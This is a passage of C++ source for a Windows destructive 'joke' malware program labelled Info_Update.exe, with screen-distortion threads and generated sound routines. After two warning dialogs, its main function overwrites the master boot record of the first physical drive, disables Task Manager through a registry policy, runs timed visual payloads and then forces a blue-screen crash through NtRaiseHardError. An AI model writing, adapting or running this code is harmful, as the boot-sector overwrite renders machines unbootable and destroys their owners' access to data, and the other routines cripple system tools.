        x = rand() % w;
        BitBlt(hdc, x, 1, 10, h, hdc, x, 0, SRCCOPY);
        Sleep(250);
    }
    return 0;
}

DWORD WINAPI drawuser32icon(LPVOID lpParam) {
    int w{ GetSystemMetrics(SM_CXSCREEN) };
    int h{ GetSystemMetrics(SM_CYSCREEN) };
    HWND hwnd = GetDesktopWindow();
    HINSTANCE User32 = LoadLibrary(_T("User32.dll"));
    HDC hdc = GetWindowDC(hwnd);
    srand(time(0));
    Sleep(1000);
    while (1) {
        for (int x = 0; x <= w; x += 32) {
            for (int y = 0; y <= h; y += 32) {
                DrawIcon(hdc, x, y, LoadIcon(User32, MAKEINTRESOURCE(rand() % 256)));
            }
        }
        Sleep(250);
    }
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & ((t >> 18) + ((t >> 11) & t))) * t + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI profect(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI drawEllipse(LPVOID lpParam)
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);


    while (1)
    {
        HDC hdc = GetDC(0);
        int rand_num_x = rand() % w;
        int rand_num_y = rand() % h;

        int top_x = 0 + rand_num_x;
        int top_y = 0 + rand_num_y;

        int bottom_x = 100 + rand_num_x;
        int bottom_y = 100 + rand_num_y;

        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        Sleep(100);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (3 + (1 & t >> 7)) >> (2 & t >> 6) | t >> 3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int killmbr()
{
    BYTE pmbr[9728] = { 0 };
    DWORD write;
    HANDLE mbr;
    char mbrdata[mbrsize] = boot;
    memcpy(pmbr, mbrdata, sizeof(mbrdata) - 1);
    pmbr[510] = 0x55;
    pmbr[511] = 0xAA;
    mbr = CreateFile
    (
        L"\\\\.\\PHYSICALDRIVE0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (WriteFile(mbr, pmbr, sizeof(pmbr), &write, NULL) == TRUE)
    {
    }
    else
    {
    }
    CloseHandle(mbr);
    return EXIT_SUCCESS;
}

void disabletaskmgr()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
    RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void bsod() {
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    ExitProcess(0);
}

int main() {
    CREATE_NO_WINDOW;
    if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"Info_Update.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Info_Update.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            killmbr();
            disabletaskmgr();
            sound1();
            HANDLE thread1 = CreateThread(0, 0, Fault, 0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, FanseYuanquan, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread1, 0);
            TerminateThread(thread2, 0);
            sound2();
            HANDLE thread3 = CreateThread(0, 0, rgb, 0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, DrawError4, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread3, 0);
            TerminateThread(thread4, 0);
            sound3();
            HANDLE thread5 = CreateThread(0, 0, Lines, 0, 0, 0);
            HANDLE thread6 = CreateThread(0, 0, invmelter, 0, 0, 0);
            HANDLE thread7 = CreateThread(0, 0, drawshell32icon, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread5, 0);
            TerminateThread(thread6, 0);
            TerminateThread(thread7, 0);
            sound4();
            HANDLE thread8 = CreateThread(0, 0, ColorInvert, 0, 0, 0);
            HANDLE thread9 = CreateThread(0, 0, Color, 0, 0, 0);
            HANDLE thread10 = CreateThread(0, 0, balls, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread8, 0);
            TerminateThread(thread9, 0);
            TerminateThread(thread10, 0);
            sound5();
            HANDLE thread11 = CreateThread(0, 0, CopyCur, 0, 0, 0);
            HANDLE thread12 = CreateThread(0, 0, shader4, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread11, 0);
            TerminateThread(thread12, 0);
            sound6();
            HANDLE thread13 = CreateThread(0, 0, textout, 0, 0, 0);
            HANDLE thread14 = CreateThread(0, 0, triangle, 0, 0, 0);
            HANDLE thread15 = CreateThread(0, 0, shader5, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread13, 0);
            TerminateThread(thread14, 0);
            TerminateThread(thread15, 0);
            sound7();
            HANDLE thread16 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread17 = CreateThread(0, 0, rainbowblock, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread16, 0);
            TerminateThread(thread17, 0);
            sound8();
            HANDLE thread18 = CreateThread(0, 0, pacmans, 0, 0, 0);
            HANDLE thread19 = CreateThread(0, 0, beziers, 0, 0, 0);
            HANDLE thread20 = CreateThread(0, 0, sinewaves, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread18, 0);
            TerminateThread(thread19, 0);
            TerminateThread(thread20, 0);
            sound9();
            HANDLE thread21 = CreateThread(0, 0, sh, 0, 0, 0);
            HANDLE thread22 = CreateThread(0, 0, invmelter2, 0, 0, 0);
            HANDLE thread23 = CreateThread(0, 0, drawuser32icon, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread21, 0);
            TerminateThread(thread22, 0);
            TerminateThread(thread23, 0);
            sound10();
            HANDLE thread24 = CreateThread(0, 0, profect, 0, 0, 0);
            HANDLE thread25 = CreateThread(0, 0, drawEllipse, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread24, 0);
            TerminateThread(thread25, 0);
            bsod();
            return 0;
        }

    }
}